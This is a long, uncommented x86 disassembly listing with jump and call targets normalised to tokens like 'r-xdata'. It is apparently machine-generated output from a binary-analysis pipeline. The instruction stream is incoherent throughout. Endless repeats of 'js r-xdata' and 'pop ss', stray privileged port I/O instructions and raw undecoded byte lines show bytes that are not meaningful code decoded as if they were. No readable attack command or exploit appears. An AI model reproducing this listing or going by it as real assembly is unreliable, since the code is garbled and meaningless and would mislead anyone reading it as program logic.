call 0x31b5eedf
std
js r-xdata
js r-xdata
js r-xdata
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
sub bh ah
insb
pop ss
mov fs [ ecx - 0x5b ]
test bl bl
xor eax [ eax ]
mov bl 0xe8
call 0xfffffffff42208a0
sbb [ ebx - 0x67fece9d ] 0x31
pop ss
popad
mov ch 0x48
imul ebp [ esp ] 0xffffff82
clc
lodsd [ gs : esi ]
xor al 0xbb
mov eax 0x17397201
add esp ebp
loopne r-xdata
pop ss
pushfd
0xf082018d 0xe8e8
js r-xdata
js r-xdata
js r-xdata
js r-xdata
test al 0x1
rcl [ esi ] 0x17
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sub [ edi + 0x78782b21 ] dh
int3
lodsb [ esi ]
sub bh ah
insd
mov bl 0xfb
aas
pop ss
pop ss
mov cl 0x6d
sub bh ah
insd
test al 0xa
pop ss
pop ss
add [ edx + 0xc ] ebp
pop ss
pop ss
js r-xdata
or edx [ edi ]
js r-xdata
call 0x78be7c61
sti
js r-xdata
js r-xdata
lodsb [ esi ]
js r-xdata
js r-xdata
js r-xdata
add [ ebx - 0x4155551e ] 0x1
mov esp 0xe7e8e8c9
out 0x6c eax
sub [ ecx ] al
lahf
pop ss
pop ss
pop ss
js r-xdata
js r-xdata
lodsd [ esi ]
js r-xdata
adc eax 0x117173e
jle r-xdata
js r-xdata
js r-xdata
out 0x6c eax
mov fs [ ecx - 0x6b ]
js r-xdata
pop ss
js r-xdata
js r-xdata
js r-xdata
mov ebx 0x545863be
call 0xfffffffffe47f002
daa
pop ss
pop ss
js r-xdata
das
lodsd [ esi ]
adc al 0xe9
arpl [ ecx + edi * 4 ] ax
js r-xdata
mov eax 0x9d171782
add al 0x1
and dl ah
call 0x78be7d17
js r-xdata
call 0x78be7bf2
js r-xdata
stc
js r-xdata
or eax 0x6be8e8f9
js r-xdata
js r-xdata
js r-xdata
call 0x1dd108ee
pop ss
pop ss
js r-xdata
sbb bh ah
js r-xdata
mov al 0x37
mov eax 0xec82bbbb
add [ edi - 0x10 ] ebp
call 0x78be7d12
mov ecx 0x1e0a563
js r-xdata
imul eax [ eax + esi * 8 ] 0xbbe8e8eb
add [ edx + 0x7817173b ] ebp
js r-xdata
pop ss
adc [ edi ] dl
out dx al
pushad
in al dx
rcr ebx 0x1
cmp ah [ ebx + 0x29 ]
add [ 0x78e8e8e5 ] eax
js r-xdata
pop ss
imul edx [ ebp - 0x59fe13ec ] 0x37
pop ss
pop ss
js r-xdata
sub [ ecx ] ah
sub edi [ eax + 0x78 ]
js r-xdata
sbb [ ebx + 0x38 ] ah
mov fs [ ecx - 0x43 ]
xchg ebp eax
js r-xdata
jmp 0x4a9f178
js r-xdata
pop ss
add [ ebx + 0x16 ] eax
js r-xdata
js r-xdata
js r-xdata
in al dx
add [ esi + 0x78171737 ] esp
js r-xdata
pop ss
js r-xdata
add ecx eax
push ss
pop ss
js r-xdata
add [ esp + edi + 0x17 ] al
js r-xdata
js r-xdata
mov ebp 0x46b0463
js r-xdata
jmp r-xdata
call 0x78be7b66
call 0xffffffffe4726ecd
js r-xdata
push esp
sbb eax 0xb11717
mov al 0x0
js r-xdata
js r-xdata
push 0xffffffdb
out dx al
js r-xdata
js r-xdata
js r-xdata
stc
js r-xdata
xchg ecx eax
js r-xdata
js r-xdata
arpl [ ebx ] ax
lodsd [ esi ]
loopne r-xdata
add al 0x63
js r-xdata
out 0x6d eax
js r-xdata
pop ss
pop ss
xchg ebp eax
insd
pop ss
pop ss
js r-xdata
call 0xffffffffb0470cf5
aaa
js r-xdata
pop ss
pop ss
inc ebx
push ss
js r-xdata
pop ss
popad
call 0x78be80a6
arpl [ ebp - 0xf90feec ] bp
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
add [ edi ] dl
pop ss
cmp [ edi ] dl
test al 0xfb
js r-xdata
adc ecx edi
imul ebp [ esp ] 0x1
js r-xdata
imul edx [ edi ] 0xffffffc5
mov bh 0xb3
add [ ebp + 0x78e8e8eb ] eax
add [ ebp ] esp
pop ss
call sub_4608d8
push 0x171715
sbb eax 0x6517173b
lodsd [ esi ]
or al 0xb8
lodsd [ gs : esi ]
pushad
mov eax 0xec82bbbb
mov ebx 0x173af501
and [ ebp + 0x6d ] ah
pop ss
js r-xdata
js r-xdata
call 0xffffffff9b468219
js r-xdata
call 0x78be812b
popad
xchg ebp eax
pop ss
add esi edx
call 0x1ae109aa
pop ss
fisub [ esi ]
out 0x6d eax
sbb eax 0x78781717
js r-xdata
xchg ebp eax
adc al 0xeb
add ebp ecx
js r-xdata
stosb [ edi ]
cmp edx [ edi ]
js r-xdata
and dl [ edi ]
js r-xdata
add al 0x1
adc al 0x1
js r-xdata
outsd
push ss
pop ss
out 0x6c eax
popad
xchg ebp eax
pop edx
add [ edx + 0x78171730 ] esi
js r-xdata
js r-xdata
js r-xdata
in al 0x1
js r-xdata
in al 0x1
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ ebp + 0xb ] esi
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sbb dl [ edi ]
fwait
pop ss
js r-xdata
inc esp
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
jmp r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
add [ ebp + 0x1e ] esi
js r-xdata
pop ss
js r-xdata
js r-xdata
outsd
js r-xdata
mov ebx 0x109001bb
pop ss
js r-xdata
js r-xdata
js r-xdata
sub bl 0x1
js r-xdata
or al 0x8e
js r-xdata
cmp [ eax ] edi
js r-xdata
pop ss
js r-xdata
add [ ecx ] edi
js r-xdata
call 0x78be819a
lea edx [ eax + ebp * 8 ]
aam 0x63
adc [ ebx + 0x39 ] esp
add [ ebx ] edi
movsd [ edi ] gs : [ esi ]
adc al 0xb9
insb
cld
adc eax 0x8d6b1717
adc al 0xe8
pop edi
sub al 0xe8
call 0x39d80b3c
pop ss
js r-xdata
popad
lodsd [ esi ]
mov al 0x82
xchg [ esi + 0x1f4ad61 ] cl
shr ecx cl
add [ edi - 0x8 ] esi
js r-xdata
stc
call 0x14fb6b24
add [ esi - 0x1d ] ch
call 0xffffffffe472752c
mov ebx 0xbf17ea82
add [ ebx + 0x117171a ] bl
salc
js r-xdata
in al 0x63
js r-xdata
arpl [ edi ] bp
add [ esi + esi * 8 - 0x18 ] bh
call 0x2f1d0a7e
pop ss
js r-xdata
xlat
pop ss
js r-xdata
jne r-xdata
add [ edx - 0x2 ] edi
call 0xffffffff82f681cb
test [ esi - 0x4f0d529f ] ecx
add [ esi - 0xb529e72 ] 0x1
insb
loopne r-xdata
add edx [ edi ]
pop ss
int 0x3
js r-xdata
add ecx esp
js r-xdata
pop ss
push ds
js r-xdata
js r-xdata
js r-xdata
js r-xdata
push ss
pop ss
pop ss
add [ edx - 0xc ] ebp
add [ eax + 0x171710 ] edx
push cs
js r-xdata
pop ss
js r-xdata
push ss
add eax esi
sbb [ edi ] edx
sbb eax 0x78e8e8ff
imul ebp [ eax ] 0xfffffffc
popad
lodsd [ esi ]
adc [ ecx ] al

arpl [ ecx + eax ] ax
mov ah 0xb
js r-xdata
js r-xdata
js r-xdata
js r-xdata
popad
mov ebp 0xb23163aa
mov fs [ ecx - 0x4b ]
push cs
js r-xdata
pop ss
js r-xdata
cmp [ edi ] dl
js r-xdata
add [ esi ] edx
call 0xffffffff8ebe82da
popad
pop ss
imul ebp [ esp + edi * 8 ] 0x1
pop ss
call 0xffffffff9246f33b
cmp [ edi ] edx
shl [ ebp + 0x263d01e4 ] 0x1
pop ss
js r-xdata
pop ss
js r-xdata
pop ss
mov gs [ ebp + 0x3a ]
add [ ebx + 0x78171715 ] esi
js r-xdata
pop ss
insb
jecxz r-xdata
out 0x6c eax
xor [ ecx ] al
js r-xdata
call 0x182e8b53
jle r-xdata
pop ss
js r-xdata
sbb al 0x17
pop ss
js r-xdata
out 0x6c eax
aad 0x36
pop ss
pop ss
fld [ eax ]
test al 0x1
jae r-xdata
pop ss
lodsd [ gs : esi ]
sbb [ ecx ] al
xor esi 0xffffffe8
call 0x722d316d
sub [ ecx ] eax
pop ebp
out 0xe8 al
call 0x28b38182
add eax edi
or dl [ edi ]
pop ss
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sub [ eax + 0x17344901 ] ch
pop ss
js r-xdata
pop ss
js r-xdata
js r-xdata
js r-xdata
add [ edi + 0x1f ] ebp
pop ss
pop ss
js r-xdata
mov fs [ ecx - 0x53 ]
js r-xdata
add [ edi + 0x78e8e8f9 ] edi
js r-xdata
stosb [ edi ]
arpl [ ecx ] si
mov dl 0x8e
popad
mov ch 0xe
js r-xdata
mov fs [ ecx - 0x6b ]
adc al 0xb7
sub [ edx - 0x171c6eff ] 0xe8
fist [ edi ]
popad
lodsd [ esi ]
push ds
add edi edx
aas
pop ss
pop ss
js r-xdata
mov fs [ ecx - 0x53 ]
xchg ebp eax
sbb cl [ esi + 0x63d6bd61 ]
adc [ ebx + 0x38 ] ah
mov fs [ ecx - 0x4b ]
or cl [ esi - 0x24e36a9f ]
pop ss
mov fs [ ecx - 0x43 ]
test al 0x63
xor bl bl
cmp al [ edx - 0x4a9e7161 ]
loope r-xdata
cld
add [ edi ] edx
mov fs [ ecx - 0x53 ]
cmp al 0xb0
js r-xdata
js r-xdata
mov fs [ ecx - 0x53 ]
pushfd
js r-xdata
add [ edx - 0x7 ] eax
call 0xffffffffb95aae0f
call 0x4e320aa
sti
adc eax 0x78781717
js r-xdata
js r-xdata
call r--data
js r-xdata
js r-xdata
pop ss
js r-xdata
call 0xffffffff944a715b
in al dx
call 0xcd37361
call 0xfffffffff7d40939
call 0xffffffffc4306b6b
jmp 0x78be7fb3
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0x78be811a
js r-xdata
push 0xfffffff4
or al 0xfc
mov [ 0x1d5400b0 ] eax
pop ss
js r-xdata
js r-xdata
add [ ecx ] ch
lodsd [ esi ]
adc al 0x50
call 0xffffffffe82ef481
dec edx
add [ ecx + 0x2d ] esi
pop ss
pop ss
js r-xdata
xor al 0xb0
sbb [ esi + 0x618e1063 ] 0x95
arpl [ ss : esi ] dx
mov fs [ ecx - 0x6b ]
or bl bl
pop ss
add edi edi
cmp [ edi ] dl
pop ss
js r-xdata
insb
xor al 0xe4
call 0x31770d24
pop ss
pop ss
js r-xdata
xor ah [ ebx + 0x2e ]
mov fs [ ecx - 0x53 ]
lodsd [ esi ]
mov cl 0x6d
sub bh ah
insb
mov ebp edi
call 0xfc50c90
pop ss
pop ss
out 0x6d eax
in eax 0x32
pop ss
pop ss
xchg ebp eax
push eax
pop eax
xor [ edx + 0xeb5618e ] esi
js r-xdata
lodsd [ esi ]
add al 0xa5
js r-xdata
cld
call 0x78be82a9
js r-xdata
add [ 0x6be8e8e2 ] ch
sub al 0xe4
adc [ edx - 0x71e99c42 ] al
popad
xchg ebp eax
adc bl bl
pop ss
mov fs [ ecx - 0x6b ]
fld [ eax ]
popad
lodsd [ esi ]
add [ edi + 0x1b ] esp
pop ss
pop ss
pop ss
js r-xdata
jecxz r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
adc al 0xe4
call 0x1f5f0937
pop ss
insb
pop ss
mov cl 0x0
add [ ebp + ebx + 0x17 ] dl
mov eax 0xe8e48a01
call 0x78be7b70
js r-xdata
js r-xdata
mov eax 0x173b7101
js r-xdata
and eax esp
call 0x78be84a7
js r-xdata
insb
int3
jbe r-xdata
out 0x66 eax
jmp r-xdata
js r-xdata
adc eax 0x42001717
js r-xdata
mov [ 0xffffffffad2fa5be ] eax
movsd [ edi ] [ esi ]
js r-xdata
js r-xdata
js r-xdata
xor [ eax - 0x66fe7a7e ] dh
lodsd [ esi ]
js r-xdata
lodsd [ esi ]
jl r-xdata
js r-xdata
js r-xdata
sbb al 0x1
xchg [ edi + edx ] dl
pop ss
js r-xdata
add [ 0x65171736 ] cl
xchg ebp eax
add [ ecx + 0x78e8e8e3 ] edx
imul ecx [ ebp - 0x5a9a17ec ] 0x14
mov ecx 0xe8f94201
add al 0xf0
jmp r-xdata
pop ss
lds esi [ edi - 0x147afe4d ]
call 0x65477b6c
pop ss
js r-xdata
js r-xdata
jno r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
sbb [ esi + ecx * 4 - 0x4ffb529f ] 0x82
or [ esi - 0x4ff9529f ] 0xbe018e82
xor [ edi ] edx
pop ss
js r-xdata
call 0xffffffffb046f445
add [ edi ] dl
pop ss
xor [ edx - 0x40fa48f9 ] 0x61
scasb [ edi ]
adc eax 0x7c001717
cmp [ edi ] dl
pop ss
add [ edi - 0x1 ] ebp
call 0x78be83c4
js r-xdata
pop eax
xor eax 0x78781717
js r-xdata
cdq
pop ss
insd
sub bh ah
insd
pop ds
xor [ edi ] edx
pop ss
xchg ebp eax
add [ ebp + 0x65 ] ah
pop eax
pop ss
js r-xdata
movsd [ edi ] [ esi ]
mov al 0x8d
das
mov esi 0x3cad2fa5
mov al 0x8d
xchg [ esi - 0x5acf52d1 ] bh
js r-xdata
pop eax
js r-xdata
pop ss
js r-xdata
insd
xor ebp eax
call 0x7cf36fb5
mov al 0x82
js r-xdata
pop ss
js r-xdata
or edx [ edi ]
jne r-xdata
add [ esi ] cl
js r-xdata
js r-xdata
js r-xdata
js r-xdata
sbb edx [ edi ]
pop ss
add esp ebp
pop ss
pop ss
js r-xdata
pop ss
add [ edi ] edi
js r-xdata
movhps [ edi ] xmm2
mov esi 0x17097d01
pop ss
pop ss
mov edi 0x17106b8c
out 0x6c eax
0x1e8e8e0 0x2452
sar [ eax - 0x18171753 ] 0x1
js r-xdata
call 0xffffffff80fef431
in al dx
jmp 0x4347f437
js r-xdata
pushfd
mov fs [ ecx - 0x53 ]
add al 0xb0
add [ ecx + 0x6ad618e ] 0xb0
or [ esi + 0x1731be01 ] 0x17
js r-xdata
cmp [ edi ] dl
inc edx
js r-xdata
cmp al 0xb0
lea eax [ esi + 0x30ad2fbe ]
movsd [ edi ] [ esi ]
das
lodsd [ esi ]
js r-xdata
pop ss
js r-xdata
lodsd [ esi ]
xor al 0x86
mov esi 0x5900a5a5
add [ edi ] edx
pop ss
mov bh 0xb6
add [ ebp + 0x78171703 ] ebp
js r-xdata
lea ebp [ edi ]
js r-xdata
test [ ecx ] eax
js r-xdata
pop ss
mov esi 0x61bbd858
js r-xdata
js r-xdata
js r-xdata
js r-xdata
imul ebp [ eax + edx * 8 ] 0x1
js r-xdata
js r-xdata
pop ss
pop ss
lodsd [ esi ]
loopne r-xdata
add dl [ edi ]
aas
js r-xdata
mov eax 0x1700a200
pop ss
and [ ebp + 0x1baf7fa ] 0xa4
add edx [ edi ]
pop ss
js r-xdata
popad
movsd [ edi ] [ esi ]
sbb dh [ ecx + 0x618ec682 ]
movsd [ edi ] [ esi ]
sbb al 0xb1
add [ esi ] ecx
0xbe84d5
jb r-xdata
movhps [ edi ] xmm2
js r-xdata
pop ss
xor [ edi ] edx
pop ss
js r-xdata
mov al 0x1
push ss
call 0x78be8249
js r-xdata
mov ebx 0x1b8bf17
adc al 0x17
add [ edx + 0x38 ] al
js r-xdata
insd
cmp al [ ecx ]
mov bl 0x15
pop ss
pop ss
js r-xdata
insb
mov edx 0xe717173e
pop edi
0x17172401 0x7817
call 0xffffffffadabf6a9
sub [ eax + 0x15b46d65 ] bh
call 0xf390e83
fdivr [ ebx - 0x17fb919f ]
js r-xdata
js r-xdata
pop eax
js r-xdata
js r-xdata
js r-xdata
pop ss
lodsd [ esi ]
sub [ eax - 0x17ff80e9 ] bh
js r-xdata
sbb edx [ edi ]
pop ss
js r-xdata
in eax 0x1b
pop ss
pop ss
pop ss
js r-xdata
pop ss
js r-xdata
mov cl 0xb1
movsd [ edi ] gs : [ esi ]
xor [ ecx - 0x3fe577e ] bh
pop ss
pop ss
mov eax 0x170f2900
pop ss
popad
mov ch 0x30
pop ss
popfd
sbb [ edi + 0x173ce900 ] bh
pop ss
sbb [ esi + ecx * 4 - 0x24c1529f ] 0x28
js r-xdata
loopne r-xdata
adc edx ebx
out 0x6d eax
das
pop ds
pop ss
pop ss
arpl [ eax - 0x1801fe20 ] sp
call 0x6a47bee2
pop ss
pop ss
pop ss
jle r-xdata
outsb
popad
js r-xdata
mov bl 0x2b
js r-xdata
mov ebx 0xe8046e61
js r-xdata
js r-xdata
out dx al
call 0x78be849a
mov eax [ 0x78e8e8ee ]
js r-xdata
call 0x28f373aa
mov eax 0x15b46d65
mov eax 0xe8007f17
mov bl 0x8e
popad
mov ch 0x16
add [ ebp - 0x4a9e714d ] 0xe8
add [ esi + 0x618e3263 ] 0xb5
0xb5618eb3 0x82ec
mov ch 0xea
mov bl 0x8e
popad
mov ch 0xec
sbb dh 0xb3
add ecx ecx
daa
pop ss
pop ss
js r-xdata
arpl [ eax - 0x1b579c1c ] bp
arpl ax bp
arpl ax bp
arpl [ eax - 0x33139e10 ] bp
arpl sp bp
int3
insd
sub bh ah
insb
js r-xdata
js r-xdata
js r-xdata
mov fs [ ecx - 0x53 ]
js r-xdata
jecxz r-xdata
mov eax 0xe7286dcc
insb
inc edx
jmp r-xdata
arpl [ ebp - 0x3347e820 ] bp
insd
sub bh ah
call 0x28b3f6ed
add ebp edx
or [ edi ] edx
pop ss
js r-xdata
add al 0xe8
js r-xdata
pop ss
js r-xdata
js r-xdata
insd
sub edi [ eax + 0x78 ]
pop ss
popfd
or [ ecx ] al
cmp eax 0x78781717
js r-xdata
out dx al
pop es
pop ss
pop ss
add [ ecx ] esp
push ds
pop ss
pop ss
js r-xdata
insb
js r-xdata
lea ecx [ edx ]
out 0x6c eax
js r-xdata
jg r-xdata
pop ss
js r-xdata
pop ss
insb
xlat
xor edx [ edi ]
pop ss
add [ edx ] edi
das
pop ss
js r-xdata
sbb edx [ edi ]
sbb edx [ bx ]
lodsd [ gs : esi ]
pop ss
pop ss
js r-xdata
js r-xdata
push esp
mov eax 0xe8f92401
call 0x7c47b71c
add dl [ edi ]
mov cl 0x6d
sub bh ah
insd
or eax 0x65e8e8f9
lodsd [ esi ]
js r-xdata
js r-xdata
call 0x4247f611
or [ edi ] dl
js r-xdata
pop ss
pop ss
or dh 0x8b
cmp [ edi - 0x45 ] 0x61
outsb
add al ch
call 0xf280e94
pop ss
pop ss
add [ esi + 0x78171737 ] edi
mov eax 0xb828ad65
pop ss
jg r-xdata
call 0xfffffffff346f682
push cs
js r-xdata
pop ss
mov eax 0x65e09d17
lodsd [ esi ]
cmp al 0x1
xchg esi eax
add eax 0x3c011717
sub eax 0x6ce71717
xor [ ebp + 0x33 ] ch
out 0x6c eax
dec esp
aaa
pop ss
pop ss
add bh 0xb1
or eax 0x7661bb76
cmp al ch
call 0xf170e65
pop ss
pop ss
sbb [ ecx - 0x4427a742 ] 0x61
out dx al
add ah al
push cs
pop ss
pop ss
add [ ebx - 0x4427a742 ] 0x61
js r-xdata
jo r-xdata
js r-xdata
or ebx [ ebx ]
js r-xdata
jg r-xdata
js r-xdata
pop ss
js r-xdata
lodsd [ gs : esi ]
dec eax
mov eax 0x64002e63
adc [ edi ] dl
pop ss
add al 0xe4
add [ eax + ebx + 0x17 ] ebp
pop ss
js r-xdata
js r-xdata
add [ 0x7817173a ] edi
popfd
pop ss
pop ss
stosd [ edi ]
imul ebp [ edi ] 0xe8e8e86c
add [ esi ] ebx
or [ edi ] edx
pop ss
js r-xdata
mov edx 0x117171b
in al dx
out 0x6c eax
mov dh 0x1b
pop ss
pop ss
imul edx eax 0xe8e8adb8
out 0x6d eax
sub [ esi + 0x171bf701 ] dh
pop ss
pop ss
fistp [ esi ]
shr [ ebx ] cl
out 0x6e eax
and eax 0x1171711
cmp eax 0x7817173a
call 0x14880f12
js r-xdata
jno r-xdata
sub bh ah
insb
retn 0x171e
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0x7871f7d8
js r-xdata
js r-xdata
popad
mov ch 0x14
add [ edi ] edx
pop ss
js r-xdata
insb
in al dx
call 0x17fef7b5
mov esi 0x3f0f01e0
pop ss
pop ss
js r-xdata
stosd [ edi ]
clc
insd
sub bh ah
insd
js r-xdata
js r-xdata
pop ss
add [ edx + 0x14 ] eax
js r-xdata
sub al 0x68
call 0x2c5111a5
pop ss
arpl [ ecx ] bp
and [ ebx ] ebp
js r-xdata
arpl [ eax ] sp
add dh 0x1
test [ edi ] esp
insb
int3
0x117170b 0x273f
pop ss
pop ss
js r-xdata
and [ edx + 0x278501c6 ] al
js r-xdata
js r-xdata
call 0x78be871d
js r-xdata
js r-xdata
js r-xdata
pop ss
adc al 0x1
js r-xdata
add [ ecx + edi * 8 ] esp
js r-xdata
call 0x175a4f2c
js r-xdata
pop ss
insb
js r-xdata
in al dx
fild [ eax + 0x6314b563 ]
jmp r-xdata
adc eax 0x618e1717
js r-xdata
sub edi [ eax + 0x78 ]
pop ss
mov edi 0x1b0b01bf
pop ss
js r-xdata
call 0xffffffffe8c6f867
jmp 0xffffffffcc47f86c
popad
js r-xdata
js r-xdata
jle r-xdata
mov eax 0x170c9d17
mov edi 0xe06601f4
call 0xffffffffe0e373eb
mov eax 0x40a5618e
jg r-xdata
js r-xdata
push edi
add [ edi ] dl
js r-xdata
js r-xdata
pop ss
pop ss
call 0x1ee9181
jl r-xdata
stc
mov fs [ ecx - 0x5b ]
sbb [ eax ] al
dec ebx
out dx al
call 0x65f2910f
insd
mov [ edi ] ss
pop ss
pop ss
mov esi 0xfe7501b8
call 0x78be871e
js r-xdata
adc al 0x17
inc edx
ror [ esi ] 0x1
pop ss
out 0x6c eax
pop ss
lodsd [ esi ]
adc al 0xb9
mov esi 0x15646565
pop ss
mov fs [ ecx - 0x5b ]
inc eax
fadd [ edi ]
popad
mov ch 0x48
mov fs [ ecx - 0x43 ]
dec esp
add [ eax ] dh
push edi
pop ss
pop ss
xchg ebp eax
adc eax 0x618e1717
js r-xdata
pop ss
pop ss
sub al 0x17
jle r-xdata
add [ edx + 0x117170b ] bl
aas
daa
js r-xdata
js r-xdata
js r-xdata
call 0x6e2d88c4
call 0x1fef8cc
and edi [ eax ]
js r-xdata
sub al 0x2f
lodsd [ esi ]
sbb eax 0xe882e882
mov gs [ edi ]
lodsd [ esi ]
adc [ edi ] edx
cmp [ ecx - 0x4b ] ah
test al 0xe0
popad
lodsd [ esi ]
adc al 0x1
cld
pop ss
js r-xdata
mov cl 0x1
mov bh 0x38
pop ss
pop ss
js r-xdata
js r-xdata
fidiv [ eax ]
js r-xdata
pop ss
mov fs [ ecx - 0x6b ]
js r-xdata
insd
pop esp
adc [ edi ] dl
pop ss
add eax edi
xor al 0x17
pop ss
js r-xdata
mov ch 0x1c
mov edi 0x17386600
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
sub [ ecx ] al
pop ss
js r-xdata
add [ ebx ] esp
pop ss
pop ss
js r-xdata
js r-xdata
popad
mov ch 0xa6
js r-xdata
pop ss
call 0x3869119e
imul ebp [ eax + edi * 8 ] 0x6b
xchg esp eax
int3
js r-xdata
js r-xdata
mov fs [ ecx - 0x54 ]
int3
xor al 0xe8
call 0x204cd0d
sbb [ eax ] cl
test al 0x1
mov ecx 0x78e8e8e6
js r-xdata
pop ss
js r-xdata
popad
js r-xdata
pop ss
mov ebx 0xb804ad65
add [ ebx + 0x16 ] esi
pop ss
pop ss
pushfd
int3
jle r-xdata
mov fs [ ecx - 0x4b ]
mov eax 0x36639a82
add [ ecx + 0xf ] edi
xor [ esi + 0x63a4b561 ] cl
xor [ esi + 0x63a6b561 ] ecx
sub bh ah
js r-xdata
arpl [ edi ] si
cmpsb [ esi ] [ edi ]
js r-xdata
clc
imul edx [ esp + ecx * 8 + 0x6de7e9fc ] 0x5c
add edx [ edi ]
arpl [ ebp + 0x30710114 ] bp
pop ss
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
sub [ edi ] dl
pop ss
js r-xdata
popad
lodsd [ esi ]
or [ ecx ] al
or dl [ edi ]
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0x177cdb87
pop ss
insd
sub bh ah
pop ss
pop ss
js r-xdata
insd
fadd [ edi ]
pop ss
pop ss
pop ss
pop ss
js r-xdata
call 0x1e47f9ac
push edi
pop ss
pop ss
js r-xdata
insb
js r-xdata
aaa
js r-xdata
pop ss
js r-xdata
push 0xb8e8e8e8
js r-xdata
cwde
add ebp ebp
or dl [ edi ]
pop ss
mov eax [ 0x1ca5eb10 ]
add [ edi + 0x1717173f ] ecx
jle r-xdata
add [ ecx + 0xc ] al
pop ss
js r-xdata
js r-xdata
out 0x34 eax
pop ss
pop ss
arpl [ ebp + 0x782bb5e0 ] bp
js r-xdata
mov dl 0x1
sbb esp esi
call 0xffffffffe7be8933
mov fs [ ecx - 0x43 ]
js r-xdata
out 0xe8 al
popfd
in al 0x63
lodsd [ esi ]
loopne r-xdata
out 0x6d eax
cwde
adc al 0x63
loopne r-xdata
call 0x1801f9df
jle r-xdata
add [ edi + 0x78171715 ] ecx
js r-xdata
pop ss
pop ss
js r-xdata
popad
mov ch 0xb8
sbb [ edx + 0x79013663 ] 0xf
jmp r-xdata
arpl [ ebx - 0x18d79208 ] bp
js r-xdata
cmp [ edi ] dl
call 0x2347c8cd
js r-xdata
mov eax 0x17bc9e17
js r-xdata
inc esp
call 0xffffffff9617fae8
adc al 0x1
add dl [ edi ]
pop ss
mov esi 0x17250b00
pop ss
mov cl 0x6d
insd
sub [ edi + 0x72bd618e ] 0xb2
jb r-xdata
pop ss
or esp [ 0x6db11717 ]
sbb [ ebp + 0x74bd618e ] 0xb2
mov ebp 0x9d82b272
mov fs [ ecx - 0x43 ]
je r-xdata
js r-xdata
insd
mov eax 0x6b21db8c
adc [ edi ] dl
add esi ebp
pop es
push edi
mov fs [ ecx - 0x43 ]
jbe r-xdata
call 0x17c6f9e6
call 0xffffffffbf01f9eb
add [ edi - 0x15 ] dl
call 0xffffffffe4727cf3
add [ ebx ] edi
sub dl [ edi ]
pop ss
js r-xdata
call 0xffffffffe85d91e7
js r-xdata
fld [ eax ]
add eax ebx
pop es
pop ss
or al 0x17
insb
adc edx [ edi ]
pop ss
mov eax 0x17e0ad63
insd
mov eax 0x17382301
mov fs [ ecx - 0x43 ]
mov ah 0x82
xor [ edx + 0x618e8682 ] 0x82b2b6bd
mov [ esi + 0x188bd61 ] cs
popfd
adc al 0x17
popfd
or al 0x17
mov edi 0xf3601f4
pop ss
pop ss
js r-xdata
sahf
mov esp 0x17e09d17
sub al 0x17
jle r-xdata
mov ebp 0x17267601
js r-xdata
pop ss
pop ss
add [ esi + 0x28 ] ecx
pop ss
pop ss
js r-xdata
sub [ esi + 0x782b21b3 ] dh
js r-xdata
popad
lodsd [ esi ]
inc edx
arpl [ esi ] di
out 0x6c eax
js r-xdata
js r-xdata
call 0x104ccec
push edi
jmp r-xdata
adc [ edi ] 0xe8
pop ss
insd
and [ 0xffffffffde011717 ] dl
xor [ edi ] dl
mov edi 0xdb05ad61
xor esp [ ebp - 0x53 ]
adc al 0xb8
mov ebx 0x4ad65bb
mov eax 0x17167301
pop ss
mov esi 0xe7286da4
js r-xdata
js r-xdata
call 0x2bc6fb4d
call 0xffffffffe8c8fb52
mov esi 0xe8eabf00
call 0xffffffffd22a3edf
xchg ebx eax
aam 0xe7
call 0x17609fa9
js r-xdata
sbb al 0x38
pop ss
pop ss
js r-xdata
popad
mov ebp 0x8c82b2b6
mov fs [ ecx - 0x43 ]
mov [ ecx ] al
adc [ gs : 0x1a011717 ] dl
pop ss
add [ 0x78171714 ] ecx
js r-xdata
pop ss
test al 0x6c
out dx eax
call 0xffffffffe7be8aca
insb
pop esp
js r-xdata
fld [ eax ]
add [ edi + 0x6317170c ] eax
xor [ edx - 0x4a9e7175 ] eax
inc esp
mov bl 0x8e
popad
mov ch 0x46
mov edi 0x170d0901
pop ss
js r-xdata
rcr [ ebx ] cl
out 0x6c eax
mov cl 0x3e
pop ss
pop ss
pop ss
pop edi
popfd
or al 0x17
mov edi 0x68e880f4
call 0x167215dd
pop ss
pushad
pop eax
call 0x4047fc76
out dx al
call 0xffffffffb1be8c7c
insd
sub bh ah
insb
in al dx
call 0x17fefc86
mov esi 0xa8936be0
insb
insd
sub bh ah
js r-xdata
adc al 0x17
pop ss
insd
adc al 0x1
js r-xdata
pop ss
mov [ edx ] ds
js r-xdata
pop ss
js r-xdata
call 0x14fb7506
js r-xdata
js r-xdata
js r-xdata
inc esp
push ds
pop ss
pop ss
add [ eax + 0x20 ] dl
pop ss
pop ss
arpl [ eax ] sp
add esp esi
xor [ edi ] edx
pop ss
sub dl 0x1
std
insd
mov ah 0xfd
dec edi
imul edx [ esi ] 0xffffffc8
out 0x6a eax
add eax 0x1171727
cdq
sti
call 0x12b5f962
sbb [ edi ] dl
pop ss
add [ ebx + 0x2f ] ebp
pop ss
pop ss
mov fs [ ecx - 0x20 ]
sub edi [ eax + 0x78 ]
js r-xdata
and [ ebx ] ebp
js r-xdata
js r-xdata
call 0x2bfdfd5e
js r-xdata
js r-xdata
mov [ 0x65171713 ] eax
scasd [ edi ]
out 0x6c eax
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0x25b1496
pop ss
js r-xdata
js r-xdata
mov [ edi + edx ] esi
js r-xdata
pop ss
js r-xdata
arpl [ ebp - 0x23512ccc ] bp
add [ ecx + 0x1c ] eax
pop ss
popad
mov ch 0x14
js r-xdata
js r-xdata
and eax 0x78171733
js r-xdata
push edi
js r-xdata
sbb [ ebx - 0x17137bff ] 0xe8
js r-xdata
mov ecx [ esi - 0x4cbb4a9f ]
mov fs [ ecx - 0x4b ]
inc esi
pop ss
jle r-xdata
or al 0x17
js r-xdata
call 0x78be402f
js r-xdata
js r-xdata
js r-xdata
pop ss
